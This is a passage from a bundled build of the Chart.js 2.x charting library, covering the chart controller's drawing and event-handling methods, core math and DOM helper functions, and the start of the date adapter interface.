       * @private
       */
      transition: function (easingValue) {
        var me = this;

        for (var i = 0, ilen = (me.data.datasets || []).length; i < ilen; ++i) {
          if (me.isDatasetVisible(i)) {
            me.getDatasetMeta(i).controller.transition(easingValue);
          }
        }

        me.tooltip.transition(easingValue);
      },

      /**
       * @private
       */
      _getSortedDatasetMetas: function (filterVisible) {
        var me = this;
        var datasets = me.data.datasets || [];
        var result = [];
        var i, ilen;

        for (i = 0, ilen = datasets.length; i < ilen; ++i) {
          if (!filterVisible || me.isDatasetVisible(i)) {
            result.push(me.getDatasetMeta(i));
          }
        }

        result.sort(compare2Level("order", "index"));

        return result;
      },

      /**
       * @private
       */
      _getSortedVisibleDatasetMetas: function () {
        return this._getSortedDatasetMetas(true);
      },

      /**
       * Draws all datasets unless a plugin returns `false` to the `beforeDatasetsDraw`
       * hook, in which case, plugins will not be called on `afterDatasetsDraw`.
       * @private
       */
      drawDatasets: function (easingValue) {
        var me = this;
        var metasets, i;

        if (
          core_plugins.notify(me, "beforeDatasetsDraw", [easingValue]) === false
        ) {
          return;
        }

        metasets = me._getSortedVisibleDatasetMetas();
        for (i = metasets.length - 1; i >= 0; --i) {
          me.drawDataset(metasets[i], easingValue);
        }

        core_plugins.notify(me, "afterDatasetsDraw", [easingValue]);
      },

      /**
       * Draws dataset at index unless a plugin returns `false` to the `beforeDatasetDraw`
       * hook, in which case, plugins will not be called on `afterDatasetDraw`.
       * @private
       */
      drawDataset: function (meta, easingValue) {
        var me = this;
        var args = {
          meta: meta,
          index: meta.index,
          easingValue: easingValue,
        };

        if (core_plugins.notify(me, "beforeDatasetDraw", [args]) === false) {
          return;
        }

        meta.controller.draw(easingValue);

        core_plugins.notify(me, "afterDatasetDraw", [args]);
      },

      /**
       * Draws tooltip unless a plugin returns `false` to the `beforeTooltipDraw`
       * hook, in which case, plugins will not be called on `afterTooltipDraw`.
       * @private
       */
      _drawTooltip: function (easingValue) {
        var me = this;
        var tooltip = me.tooltip;
        var args = {
          tooltip: tooltip,
          easingValue: easingValue,
        };

        if (core_plugins.notify(me, "beforeTooltipDraw", [args]) === false) {
          return;
        }

        tooltip.draw();

        core_plugins.notify(me, "afterTooltipDraw", [args]);
      },

      /**
       * Get the single element that was clicked on
       * @return An object containing the dataset index and element index of the matching element. Also contains the rectangle that was draw
       */
      getElementAtEvent: function (e) {
        return core_interaction.modes.single(this, e);
      },

      getElementsAtEvent: function (e) {
        return core_interaction.modes.label(this, e, { intersect: true });
      },

      getElementsAtXAxis: function (e) {
        return core_interaction.modes["x-axis"](this, e, { intersect: true });
      },

      getElementsAtEventForMode: function (e, mode, options) {
        var method = core_interaction.modes[mode];
        if (typeof method === "function") {
          return method(this, e, options);
        }

        return [];
      },

      getDatasetAtEvent: function (e) {
        return core_interaction.modes.dataset(this, e, { intersect: true });
      },

      getDatasetMeta: function (datasetIndex) {
        var me = this;
        var dataset = me.data.datasets[datasetIndex];
        if (!dataset._meta) {
          dataset._meta = {};
        }

        var meta = dataset._meta[me.id];
        if (!meta) {
          meta = dataset._meta[me.id] = {
            type: null,
            data: [],
            dataset: null,
            controller: null,
            hidden: null, // See isDatasetVisible() comment
            xAxisID: null,
            yAxisID: null,
            order: dataset.order || 0,
            index: datasetIndex,
          };
        }

        return meta;
      },

      getVisibleDatasetCount: function () {
        var count = 0;
        for (var i = 0, ilen = this.data.datasets.length; i < ilen; ++i) {
          if (this.isDatasetVisible(i)) {
            count++;
          }
        }
        return count;
      },

      isDatasetVisible: function (datasetIndex) {
        var meta = this.getDatasetMeta(datasetIndex);

        // meta.hidden is a per chart dataset hidden flag override with 3 states: if true or false,
        // the dataset.hidden value is ignored, else if null, the dataset hidden state is returned.
        return typeof meta.hidden === "boolean"
          ? !meta.hidden
          : !this.data.datasets[datasetIndex].hidden;
      },

      generateLegend: function () {
        return this.options.legendCallback(this);
      },

      /**
       * @private
       */
      destroyDatasetMeta: function (datasetIndex) {
        var id = this.id;
        var dataset = this.data.datasets[datasetIndex];
        var meta = dataset._meta && dataset._meta[id];

        if (meta) {
          meta.controller.destroy();
          delete dataset._meta[id];
        }
      },

      destroy: function () {
        var me = this;
        var canvas = me.canvas;
        var i, ilen;

        me.stop();

        // dataset controllers need to cleanup associated data
        for (i = 0, ilen = me.data.datasets.length; i < ilen; ++i) {
          me.destroyDatasetMeta(i);
        }

        if (canvas) {
          me.unbindEvents();
          helpers$1.canvas.clear(me);
          platform.releaseContext(me.ctx);
          me.canvas = null;
          me.ctx = null;
        }

        core_plugins.notify(me, "destroy");

        delete Chart.instances[me.id];
      },

      toBase64Image: function () {
        return this.canvas.toDataURL.apply(this.canvas, arguments);
      },

      initToolTip: function () {
        var me = this;
        me.tooltip = new core_tooltip(
          {
            _chart: me,
            _chartInstance: me, // deprecated, backward compatibility
            _data: me.data,
            _options: me.options.tooltips,
          },
          me
        );
      },

      /**
       * @private
       */
      bindEvents: function () {
        var me = this;
        var listeners = (me._listeners = {});
        var listener = function () {
          me.eventHandler.apply(me, arguments);
        };

        helpers$1.each(me.options.events, function (type) {
          platform.addEventListener(me, type, listener);
          listeners[type] = listener;
        });

        // Elements used to detect size change should not be injected for non responsive charts.
        // See https://github.com/chartjs/Chart.js/issues/2210
        if (me.options.responsive) {
          listener = function () {
            me.resize();
          };

          platform.addEventListener(me, "resize", listener);
          listeners.resize = listener;
        }
      },

      /**
       * @private
       */
      unbindEvents: function () {
        var me = this;
        var listeners = me._listeners;
        if (!listeners) {
          return;
        }

        delete me._listeners;
        helpers$1.each(listeners, function (listener, type) {
          platform.removeEventListener(me, type, listener);
        });
      },

      updateHoverStyle: function (elements, mode, enabled) {
        var prefix = enabled ? "set" : "remove";
        var element, i, ilen;

        for (i = 0, ilen = elements.length; i < ilen; ++i) {
          element = elements[i];
          if (element) {
            this.getDatasetMeta(element._datasetIndex).controller[
              prefix + "HoverStyle"
            ](element);
          }
        }

        if (mode === "dataset") {
          this.getDatasetMeta(elements[0]._datasetIndex).controller[
            "_" + prefix + "DatasetHoverStyle"
          ]();
        }
      },

      /**
       * @private
       */
      eventHandler: function (e) {
        var me = this;
        var tooltip = me.tooltip;

        if (core_plugins.notify(me, "beforeEvent", [e]) === false) {
          return;
        }

        // Buffer any update calls so that renders do not occur
        me._bufferedRender = true;
        me._bufferedRequest = null;

        var changed = me.handleEvent(e);
        // for smooth tooltip animations issue #4989
        // the tooltip should be the source of change
        // Animation check workaround:
        // tooltip._start will be null when tooltip isn't animating
        if (tooltip) {
          changed = tooltip._start
            ? tooltip.handleEvent(e)
            : changed | tooltip.handleEvent(e);
        }

        core_plugins.notify(me, "afterEvent", [e]);

        var bufferedRequest = me._bufferedRequest;
        if (bufferedRequest) {
          // If we have an update that was triggered, we need to do a normal render
          me.render(bufferedRequest);
        } else if (changed && !me.animating) {
          // If entering, leaving, or changing elements, animate the change via pivot
          me.stop();

          // We only need to render at this point. Updating will cause scales to be
          // recomputed generating flicker & using more memory than necessary.
          me.render({
            duration: me.options.hover.animationDuration,
            lazy: true,
          });
        }

        me._bufferedRender = false;
        me._bufferedRequest = null;

        return me;
      },

      /**
       * Handle an event
       * @private
       * @param {IEvent} event the event to handle
       * @return {boolean} true if the chart needs to re-render
       */
      handleEvent: function (e) {
        var me = this;
        var options = me.options || {};
        var hoverOptions = options.hover;
        var changed = false;

        me.lastActive = me.lastActive || [];

        // Find Active Elements for hover and tooltips
        if (e.type === "mouseout") {
          me.active = [];
        } else {
          me.active = me.getElementsAtEventForMode(
            e,
            hoverOptions.mode,
            hoverOptions
          );
        }

        // Invoke onHover hook
        // Need to call with native event here to not break backwards compatibility
        helpers$1.callback(
          options.onHover || options.hover.onHover,
          [e.native, me.active],
          me
        );

        if (e.type === "mouseup" || e.type === "click") {
          if (options.onClick) {
            // Use e.native here for backwards compatibility
            options.onClick.call(me, e.native, me.active);
          }
        }

        // Remove styling for last active (even if it may still be active)
        if (me.lastActive.length) {
          me.updateHoverStyle(me.lastActive, hoverOptions.mode, false);
        }

        // Built in hover styling
        if (me.active.length && hoverOptions.mode) {
          me.updateHoverStyle(me.active, hoverOptions.mode, true);
        }

        changed = !helpers$1.arrayEquals(me.active, me.lastActive);

        // Remember Last Actives
        me.lastActive = me.active;

        return changed;
      },
    }
  );

  /**
   * NOTE(SB) We actually don't use this container anymore but we need to keep it
   * for backward compatibility. Though, it can still be useful for plugins that
   * would need to work on multiple charts?!
   */
  Chart.instances = {};

  var core_controller = Chart;

  // DEPRECATIONS

  /**
   * Provided for backward compatibility, use Chart instead.
   * @class Chart.Controller
   * @deprecated since version 2.6
   * @todo remove at version 3
   * @private
   */
  Chart.Controller = Chart;

  /**
   * Provided for backward compatibility, not available anymore.
   * @namespace Chart
   * @deprecated since version 2.8
   * @todo remove at version 3
   * @private
   */
  Chart.types = {};

  /**
   * Provided for backward compatibility, not available anymore.
   * @namespace Chart.helpers.configMerge
   * @deprecated since version 2.8.0
   * @todo remove at version 3
   * @private
   */
  helpers$1.configMerge = mergeConfig;

  /**
   * Provided for backward compatibility, not available anymore.
   * @namespace Chart.helpers.scaleMerge
   * @deprecated since version 2.8.0
   * @todo remove at version 3
   * @private
   */
  helpers$1.scaleMerge = mergeScaleConfig;

  var core_helpers = function () {
    // -- Basic js utility methods

    helpers$1.where = function (collection, filterCallback) {
      if (helpers$1.isArray(collection) && Array.prototype.filter) {
        return collection.filter(filterCallback);
      }
      var filtered = [];

      helpers$1.each(collection, function (item) {
        if (filterCallback(item)) {
          filtered.push(item);
        }
      });

      return filtered;
    };
    helpers$1.findIndex = Array.prototype.findIndex
      ? function (array, callback, scope) {
          return array.findIndex(callback, scope);
        }
      : function (array, callback, scope) {
          scope = scope === undefined ? array : scope;
          for (var i = 0, ilen = array.length; i < ilen; ++i) {
            if (callback.call(scope, array[i], i, array)) {
              return i;
            }
          }
          return -1;
        };
    helpers$1.findNextWhere = function (
      arrayToSearch,
      filterCallback,
      startIndex
    ) {
      // Default to start of the array
      if (helpers$1.isNullOrUndef(startIndex)) {
        startIndex = -1;
      }
      for (var i = startIndex + 1; i < arrayToSearch.length; i++) {
        var currentItem = arrayToSearch[i];
        if (filterCallback(currentItem)) {
          return currentItem;
        }
      }
    };
    helpers$1.findPreviousWhere = function (
      arrayToSearch,
      filterCallback,
      startIndex
    ) {
      // Default to end of the array
      if (helpers$1.isNullOrUndef(startIndex)) {
        startIndex = arrayToSearch.length;
      }
      for (var i = startIndex - 1; i >= 0; i--) {
        var currentItem = arrayToSearch[i];
        if (filterCallback(currentItem)) {
          return currentItem;
        }
      }
    };

    // -- Math methods
    helpers$1.isNumber = function (n) {
      return !isNaN(parseFloat(n)) && isFinite(n);
    };
    helpers$1.almostEquals = function (x, y, epsilon) {
      return Math.abs(x - y) < epsilon;
    };
    helpers$1.almostWhole = function (x, epsilon) {
      var rounded = Math.round(x);
      return rounded - epsilon <= x && rounded + epsilon >= x;
    };
    helpers$1.max = function (array) {
      return array.reduce(function (max, value) {
        if (!isNaN(value)) {
          return Math.max(max, value);
        }
        return max;
      }, Number.NEGATIVE_INFINITY);
    };
    helpers$1.min = function (array) {
      return array.reduce(function (min, value) {
        if (!isNaN(value)) {
          return Math.min(min, value);
        }
        return min;
      }, Number.POSITIVE_INFINITY);
    };
    helpers$1.sign = Math.sign
      ? function (x) {
          return Math.sign(x);
        }
      : function (x) {
          x = +x; // convert to a number
          if (x === 0 || isNaN(x)) {
            return x;
          }
          return x > 0 ? 1 : -1;
        };
    helpers$1.toRadians = function (degrees) {
      return degrees * (Math.PI / 180);
    };
    helpers$1.toDegrees = function (radians) {
      return radians * (180 / Math.PI);
    };

    /**
     * Returns the number of decimal places
     * i.e. the number of digits after the decimal point, of the value of this Number.
     * @param {number} x - A number.
     * @returns {number} The number of decimal places.
     * @private
     */
    helpers$1._decimalPlaces = function (x) {
      if (!helpers$1.isFinite(x)) {
        return;
      }
      var e = 1;
      var p = 0;
      while (Math.round(x * e) / e !== x) {
        e *= 10;
        p++;
      }
      return p;
    };

    // Gets the angle from vertical upright to the point about a centre.
    helpers$1.getAngleFromPoint = function (centrePoint, anglePoint) {
      var distanceFromXCenter = anglePoint.x - centrePoint.x;
      var distanceFromYCenter = anglePoint.y - centrePoint.y;
      var radialDistanceFromCenter = Math.sqrt(
        distanceFromXCenter * distanceFromXCenter +
          distanceFromYCenter * distanceFromYCenter
      );

      var angle = Math.atan2(distanceFromYCenter, distanceFromXCenter);

      if (angle < -0.5 * Math.PI) {
        angle += 2.0 * Math.PI; // make sure the returned angle is in the range of (-PI/2, 3PI/2]
      }

      return {
        angle: angle,
        distance: radialDistanceFromCenter,
      };
    };
    helpers$1.distanceBetweenPoints = function (pt1, pt2) {
      return Math.sqrt(Math.pow(pt2.x - pt1.x, 2) + Math.pow(pt2.y - pt1.y, 2));
    };

    /**
     * Provided for backward compatibility, not available anymore
     * @function Chart.helpers.aliasPixel
     * @deprecated since version 2.8.0
     * @todo remove at version 3
     */
    helpers$1.aliasPixel = function (pixelWidth) {
      return pixelWidth % 2 === 0 ? 0 : 0.5;
    };

    /**
     * Returns the aligned pixel value to avoid anti-aliasing blur
     * @param {Chart} chart - The chart instance.
     * @param {number} pixel - A pixel value.
     * @param {number} width - The width of the element.
     * @returns {number} The aligned pixel value.
     * @private
     */
    helpers$1._alignPixel = function (chart, pixel, width) {
      var devicePixelRatio = chart.currentDevicePixelRatio;
      var halfWidth = width / 2;
      return (
        Math.round((pixel - halfWidth) * devicePixelRatio) / devicePixelRatio +
        halfWidth
      );
    };

    helpers$1.splineCurve = function (firstPoint, middlePoint, afterPoint, t) {
      // Props to Rob Spencer at scaled innovation for his post on splining between points
      // http://scaledinnovation.com/analytics/splines/aboutSplines.html

      // This function must also respect "skipped" points

      var previous = firstPoint.skip ? middlePoint : firstPoint;
      var current = middlePoint;
      var next = afterPoint.skip ? middlePoint : afterPoint;

      var d01 = Math.sqrt(
        Math.pow(current.x - previous.x, 2) +
          Math.pow(current.y - previous.y, 2)
      );
      var d12 = Math.sqrt(
        Math.pow(next.x - current.x, 2) + Math.pow(next.y - current.y, 2)
      );

      var s01 = d01 / (d01 + d12);
      var s12 = d12 / (d01 + d12);

      // If all points are the same, s01 & s02 will be inf
      s01 = isNaN(s01) ? 0 : s01;
      s12 = isNaN(s12) ? 0 : s12;

      var fa = t * s01; // scaling factor for triangle Ta
      var fb = t * s12;

      return {
        previous: {
          x: current.x - fa * (next.x - previous.x),
          y: current.y - fa * (next.y - previous.y),
        },
        next: {
          x: current.x + fb * (next.x - previous.x),
          y: current.y + fb * (next.y - previous.y),
        },
      };
    };
    helpers$1.EPSILON = Number.EPSILON || 1e-14;
    helpers$1.splineCurveMonotone = function (points) {
      // This function calculates B??zier control points in a similar way than |splineCurve|,
      // but preserves monotonicity of the provided data and ensures no local extremums are added
      // between the dataset discrete points due to the interpolation.
      // See : https://en.wikipedia.org/wiki/Monotone_cubic_interpolation

      var pointsWithTangents = (points || []).map(function (point) {
        return {
          model: point._model,
          deltaK: 0,
          mK: 0,
        };
      });

      // Calculate slopes (deltaK) and initialize tangents (mK)
      var pointsLen = pointsWithTangents.length;
      var i, pointBefore, pointCurrent, pointAfter;
      for (i = 0; i < pointsLen; ++i) {
        pointCurrent = pointsWithTangents[i];
        if (pointCurrent.model.skip) {
          continue;
        }

        pointBefore = i > 0 ? pointsWithTangents[i - 1] : null;
        pointAfter = i < pointsLen - 1 ? pointsWithTangents[i + 1] : null;
        if (pointAfter && !pointAfter.model.skip) {
          var slopeDeltaX = pointAfter.model.x - pointCurrent.model.x;

          // In the case of two points that appear at the same x pixel, slopeDeltaX is 0
          pointCurrent.deltaK =
            slopeDeltaX !== 0
              ? (pointAfter.model.y - pointCurrent.model.y) / slopeDeltaX
              : 0;
        }

        if (!pointBefore || pointBefore.model.skip) {
          pointCurrent.mK = pointCurrent.deltaK;
        } else if (!pointAfter || pointAfter.model.skip) {
          pointCurrent.mK = pointBefore.deltaK;
        } else if (
          this.sign(pointBefore.deltaK) !== this.sign(pointCurrent.deltaK)
        ) {
          pointCurrent.mK = 0;
        } else {
          pointCurrent.mK = (pointBefore.deltaK + pointCurrent.deltaK) / 2;
        }
      }

      // Adjust tangents to ensure monotonic properties
      var alphaK, betaK, tauK, squaredMagnitude;
      for (i = 0; i < pointsLen - 1; ++i) {
        pointCurrent = pointsWithTangents[i];
        pointAfter = pointsWithTangents[i + 1];
        if (pointCurrent.model.skip || pointAfter.model.skip) {
          continue;
        }

        if (helpers$1.almostEquals(pointCurrent.deltaK, 0, this.EPSILON)) {
          pointCurrent.mK = pointAfter.mK = 0;
          continue;
        }

        alphaK = pointCurrent.mK / pointCurrent.deltaK;
        betaK = pointAfter.mK / pointCurrent.deltaK;
        squaredMagnitude = Math.pow(alphaK, 2) + Math.pow(betaK, 2);
        if (squaredMagnitude <= 9) {
          continue;
        }

        tauK = 3 / Math.sqrt(squaredMagnitude);
        pointCurrent.mK = alphaK * tauK * pointCurrent.deltaK;
        pointAfter.mK = betaK * tauK * pointCurrent.deltaK;
      }

      // Compute control points
      var deltaX;
      for (i = 0; i < pointsLen; ++i) {
        pointCurrent = pointsWithTangents[i];
        if (pointCurrent.model.skip) {
          continue;
        }

        pointBefore = i > 0 ? pointsWithTangents[i - 1] : null;
        pointAfter = i < pointsLen - 1 ? pointsWithTangents[i + 1] : null;
        if (pointBefore && !pointBefore.model.skip) {
          deltaX = (pointCurrent.model.x - pointBefore.model.x) / 3;
          pointCurrent.model.controlPointPreviousX =
            pointCurrent.model.x - deltaX;
          pointCurrent.model.controlPointPreviousY =
            pointCurrent.model.y - deltaX * pointCurrent.mK;
        }
        if (pointAfter && !pointAfter.model.skip) {
          deltaX = (pointAfter.model.x - pointCurrent.model.x) / 3;
          pointCurrent.model.controlPointNextX = pointCurrent.model.x + deltaX;
          pointCurrent.model.controlPointNextY =
            pointCurrent.model.y + deltaX * pointCurrent.mK;
        }
      }
    };
    helpers$1.nextItem = function (collection, index, loop) {
      if (loop) {
        return index >= collection.length - 1
          ? collection[0]
          : collection[index + 1];
      }
      return index >= collection.length - 1
        ? collection[collection.length - 1]
        : collection[index + 1];
    };
    helpers$1.previousItem = function (collection, index, loop) {
      if (loop) {
        return index <= 0
          ? collection[collection.length - 1]
          : collection[index - 1];
      }
      return index <= 0 ? collection[0] : collection[index - 1];
    };
    // Implementation of the nice number algorithm used in determining where axis labels will go
    helpers$1.niceNum = function (range, round) {
      var exponent = Math.floor(helpers$1.log10(range));
      var fraction = range / Math.pow(10, exponent);
      var niceFraction;

      if (round) {
        if (fraction < 1.5) {
          niceFraction = 1;
        } else if (fraction < 3) {
          niceFraction = 2;
        } else if (fraction < 7) {
          niceFraction = 5;
        } else {
          niceFraction = 10;
        }
      } else if (fraction <= 1.0) {
        niceFraction = 1;
      } else if (fraction <= 2) {
        niceFraction = 2;
      } else if (fraction <= 5) {
        niceFraction = 5;
      } else {
        niceFraction = 10;
      }

      return niceFraction * Math.pow(10, exponent);
    };
    // Request animation polyfill - https://www.paulirish.com/2011/requestanimationframe-for-smart-animating/
    helpers$1.requestAnimFrame = (function () {
      if (typeof window === "undefined") {
        return function (callback) {
          callback();
        };
      }
      return (
        window.requestAnimationFrame ||
        window.webkitRequestAnimationFrame ||
        window.mozRequestAnimationFrame ||
        window.oRequestAnimationFrame ||
        window.msRequestAnimationFrame ||
        function (callback) {
          return window.setTimeout(callback, 1000 / 60);
        }
      );
    })();
    // -- DOM methods
    helpers$1.getRelativePosition = function (evt, chart) {
      var mouseX, mouseY;
      var e = evt.originalEvent || evt;
      var canvas = evt.target || evt.srcElement;
      var boundingRect = canvas.getBoundingClientRect();

      var touches = e.touches;
      if (touches && touches.length > 0) {
        mouseX = touches[0].clientX;
        mouseY = touches[0].clientY;
      } else {
        mouseX = e.clientX;
        mouseY = e.clientY;
      }

      // Scale mouse coordinates into canvas coordinates
      // by following the pattern laid out by 'jerryj' in the comments of
      // https://www.html5canvastutorials.com/advanced/html5-canvas-mouse-coordinates/
      var paddingLeft = parseFloat(helpers$1.getStyle(canvas, "padding-left"));
      var paddingTop = parseFloat(helpers$1.getStyle(canvas, "padding-top"));
      var paddingRight = parseFloat(
        helpers$1.getStyle(canvas, "padding-right")
      );
      var paddingBottom = parseFloat(
        helpers$1.getStyle(canvas, "padding-bottom")
      );
      var width =
        boundingRect.right - boundingRect.left - paddingLeft - paddingRight;
      var height =
        boundingRect.bottom - boundingRect.top - paddingTop - paddingBottom;

      // We divide by the current device pixel ratio, because the canvas is scaled up by that amount in each direction. However
      // the backend model is in unscaled coordinates. Since we are going to deal with our model coordinates, we go back here
      mouseX = Math.round(
        (((mouseX - boundingRect.left - paddingLeft) / width) * canvas.width) /
          chart.currentDevicePixelRatio
      );
      mouseY = Math.round(
        (((mouseY - boundingRect.top - paddingTop) / height) * canvas.height) /
          chart.currentDevicePixelRatio
      );

      return {
        x: mouseX,
        y: mouseY,
      };
    };

    // Private helper function to convert max-width/max-height values that may be percentages into a number
    function parseMaxStyle(styleValue, node, parentProperty) {
      var valueInPixels;
      if (typeof styleValue === "string") {
        valueInPixels = parseInt(styleValue, 10);

        if (styleValue.indexOf("%") !== -1) {
          // percentage * size in dimension
          valueInPixels =
            (valueInPixels / 100) * node.parentNode[parentProperty];
        }
      } else {
        valueInPixels = styleValue;
      }

      return valueInPixels;
    }

    /**
     * Returns if the given value contains an effective constraint.
     * @private
     */
    function isConstrainedValue(value) {
      return value !== undefined && value !== null && value !== "none";
    }

    /**
     * Returns the max width or height of the given DOM node in a cross-browser compatible fashion
     * @param {HTMLElement} domNode - the node to check the constraint on
     * @param {string} maxStyle - the style that defines the maximum for the direction we are using ('max-width' / 'max-height')
     * @param {string} percentageProperty - property of parent to use when calculating width as a percentage
     * @see {@link https://www.nathanaeljones.com/blog/2013/reading-max-width-cross-browser}
     */
    function getConstraintDimension(domNode, maxStyle, percentageProperty) {
      var view = document.defaultView;
      var parentNode = helpers$1._getParentNode(domNode);
      var constrainedNode = view.getComputedStyle(domNode)[maxStyle];
      var constrainedContainer = view.getComputedStyle(parentNode)[maxStyle];
      var hasCNode = isConstrainedValue(constrainedNode);
      var hasCContainer = isConstrainedValue(constrainedContainer);
      var infinity = Number.POSITIVE_INFINITY;

      if (hasCNode || hasCContainer) {
        return Math.min(
          hasCNode
            ? parseMaxStyle(constrainedNode, domNode, percentageProperty)
            : infinity,
          hasCContainer
            ? parseMaxStyle(
                constrainedContainer,
                parentNode,
                percentageProperty
              )
            : infinity
        );
      }

      return "none";
    }
    // returns Number or undefined if no constraint
    helpers$1.getConstraintWidth = function (domNode) {
      return getConstraintDimension(domNode, "max-width", "clientWidth");
    };
    // returns Number or undefined if no constraint
    helpers$1.getConstraintHeight = function (domNode) {
      return getConstraintDimension(domNode, "max-height", "clientHeight");
    };
    /**
     * @private
     */
    helpers$1._calculatePadding = function (
      container,
      padding,
      parentDimension
    ) {
      padding = helpers$1.getStyle(container, padding);

      return padding.indexOf("%") > -1
        ? (parentDimension * parseInt(padding, 10)) / 100
        : parseInt(padding, 10);
    };
    /**
     * @private
     */
    helpers$1._getParentNode = function (domNode) {
      var parent = domNode.parentNode;
      if (parent && parent.toString() === "[object ShadowRoot]") {
        parent = parent.host;
      }
      return parent;
    };
    helpers$1.getMaximumWidth = function (domNode) {
      var container = helpers$1._getParentNode(domNode);
      if (!container) {
        return domNode.clientWidth;
      }

      var clientWidth = container.clientWidth;
      var paddingLeft = helpers$1._calculatePadding(
        container,
        "padding-left",
        clientWidth
      );
      var paddingRight = helpers$1._calculatePadding(
        container,
        "padding-right",
        clientWidth
      );

      var w = clientWidth - paddingLeft - paddingRight;
      var cw = helpers$1.getConstraintWidth(domNode);
      return isNaN(cw) ? w : Math.min(w, cw);
    };
    helpers$1.getMaximumHeight = function (domNode) {
      var container = helpers$1._getParentNode(domNode);
      if (!container) {
        return domNode.clientHeight;
      }

      var clientHeight = container.clientHeight;
      var paddingTop = helpers$1._calculatePadding(
        container,
        "padding-top",
        clientHeight
      );
      var paddingBottom = helpers$1._calculatePadding(
        container,
        "padding-bottom",
        clientHeight
      );

      var h = clientHeight - paddingTop - paddingBottom;
      var ch = helpers$1.getConstraintHeight(domNode);
      return isNaN(ch) ? h : Math.min(h, ch);
    };
    helpers$1.getStyle = function (el, property) {
      return el.currentStyle
        ? el.currentStyle[property]
        : document.defaultView
            .getComputedStyle(el, null)
            .getPropertyValue(property);
    };
    helpers$1.retinaScale = function (chart, forceRatio) {
      var pixelRatio = (chart.currentDevicePixelRatio =
        forceRatio ||
        (typeof window !== "undefined" && window.devicePixelRatio) ||
        1);
      if (pixelRatio === 1) {
        return;
      }

      var canvas = chart.canvas;
      var height = chart.height;
      var width = chart.width;

      canvas.height = height * pixelRatio;
      canvas.width = width * pixelRatio;
      chart.ctx.scale(pixelRatio, pixelRatio);

      // If no style has been set on the canvas, the render size is used as display size,
      // making the chart visually bigger, so let's enforce it to the "correct" values.
      // See https://github.com/chartjs/Chart.js/issues/3575
      if (!canvas.style.height && !canvas.style.width) {
        canvas.style.height = height + "px";
        canvas.style.width = width + "px";
      }
    };
    // -- Canvas methods
    helpers$1.fontString = function (pixelSize, fontStyle, fontFamily) {
      return fontStyle + " " + pixelSize + "px " + fontFamily;
    };
    helpers$1.longestText = function (ctx, font, arrayOfThings, cache) {
      cache = cache || {};
      var data = (cache.data = cache.data || {});
      var gc = (cache.garbageCollect = cache.garbageCollect || []);

      if (cache.font !== font) {
        data = cache.data = {};
        gc = cache.garbageCollect = [];
        cache.font = font;
      }

      ctx.font = font;
      var longest = 0;
      var ilen = arrayOfThings.length;
      var i, j, jlen, thing, nestedThing;
      for (i = 0; i < ilen; i++) {
        thing = arrayOfThings[i];

        // Undefined strings and arrays should not be measured
        if (
          thing !== undefined &&
          thing !== null &&
          helpers$1.isArray(thing) !== true
        ) {
          longest = helpers$1.measureText(ctx, data, gc, longest, thing);
        } else if (helpers$1.isArray(thing)) {
          // if it is an array lets measure each element
          // to do maybe simplify this function a bit so we can do this more recursively?
          for (j = 0, jlen = thing.length; j < jlen; j++) {
            nestedThing = thing[j];
            // Undefined strings and arrays should not be measured
            if (
              nestedThing !== undefined &&
              nestedThing !== null &&
              !helpers$1.isArray(nestedThing)
            ) {
              longest = helpers$1.measureText(
                ctx,
                data,
                gc,
                longest,
                nestedThing
              );
            }
          }
        }
      }

      var gcLen = gc.length / 2;
      if (gcLen > arrayOfThings.length) {
        for (i = 0; i < gcLen; i++) {
          delete data[gc[i]];
        }
        gc.splice(0, gcLen);
      }
      return longest;
    };
    helpers$1.measureText = function (ctx, data, gc, longest, string) {
      var textWidth = data[string];
      if (!textWidth) {
        textWidth = data[string] = ctx.measureText(string).width;
        gc.push(string);
      }
      if (textWidth > longest) {
        longest = textWidth;
      }
      return longest;
    };

    /**
     * @deprecated
     */
    helpers$1.numberOfLabelLines = function (arrayOfThings) {
      var numberOfLines = 1;
      helpers$1.each(arrayOfThings, function (thing) {
        if (helpers$1.isArray(thing)) {
          if (thing.length > numberOfLines) {
            numberOfLines = thing.length;
          }
        }
      });
      return numberOfLines;
    };

    helpers$1.color = !chartjsColor
      ? function (value) {
          console.error("Color.js not found!");
          return value;
        }
      : function (value) {
          /* global CanvasGradient */
          if (value instanceof CanvasGradient) {
            value = core_defaults.global.defaultColor;
          }

          return chartjsColor(value);
        };

    helpers$1.getHoverColor = function (colorValue) {
      /* global CanvasPattern */
      return colorValue instanceof CanvasPattern ||
        colorValue instanceof CanvasGradient
        ? colorValue
        : helpers$1.color(colorValue).saturate(0.5).darken(0.1).rgbString();
    };
  };

  function abstract() {
    throw new Error(
      "This method is not implemented: either no adapter can " +
        "be found or an incomplete integration was provided."
    );
  }

  /**
   * Date adapter (current used by the time scale)
   * @namespace Chart._adapters._date
   * @memberof Chart._adapters
   * @private
   */

  /**
   * Currently supported unit string values.
   * @typedef {('millisecond'|'second'|'minute'|'hour'|'day'|'week'|'month'|'quarter'|'year')}
   * @memberof Chart._adapters._date
   * @name Unit
   */

  /**
   * @class
   */
  function DateAdapter(options) {
    this.options = options || {};
  }

  helpers$1.extend(
    DateAdapter.prototype,
    /** @lends DateAdapter */ {
      /**
       * Returns a map of time formats for the supported formatting units defined
       * in Unit as well as 'datetime' representing a detailed date/time string.
       * @returns {{string: string}}
       */
      formats: abstract,

      /**
       * Parses the given `value` and return the associated timestamp.
       * @param {any} value - the value to parse (usually comes from the data)
       * @param {string} [format] - the expected data format
       * @returns {(number|null)}
       * @function
       */
      parse: abstract,

      /**
       * Returns the formatted date in the specified `format` for a given `timestamp`.
       * @param {number} timestamp - the timestamp to format
       * @param {string} format - the date/time token
       * @return {string}
       * @function
       */
      format: abstract,

      /**
       * Adds the specified `amount` of `unit` to the given `timestamp`.
       * @param {number} timestamp - the input timestamp
       * @param {number} amount - the amount to add
       * @param {Unit} unit - the unit as string
       * @return {number}
       * @function
       */
      add: abstract,

      /**
       * Returns the number of `unit` between the given timestamps.
       * @param {number} max - the input timestamp (reference)
       * @param {number} min - the timestamp to substract
       * @param {Unit} unit - the unit as string
       * @return {number}
       * @function
       */
      diff: abstract,

      /**
       * Returns start of `unit` for the given `timestamp`.
       * @param {number} timestamp - the input timestamp
       * @param {Unit} unit - the unit as string
       * @param {number} [weekday] - the ISO day of the week with 1 being Monday
       * and 7 being Sunday (only needed if param *unit* is `isoWeek`).
       * @function
       */
      startOf: abstract,

      /**
       * Returns end of `unit` for the given `timestamp`.
       * @param {number} timestamp - the input timestamp
       * @param {Unit} unit - the unit as string
       * @function
       */
      endOf: abstract,

      // DEPRECATIONS

      /**
       * Provided for backward compatibility for scale.getValueForPixel(),
       * this method should be overridden only by the moment adapter.
       * @deprecated since version 2.8.0
       * @todo remove at version 3
       * @private
       */
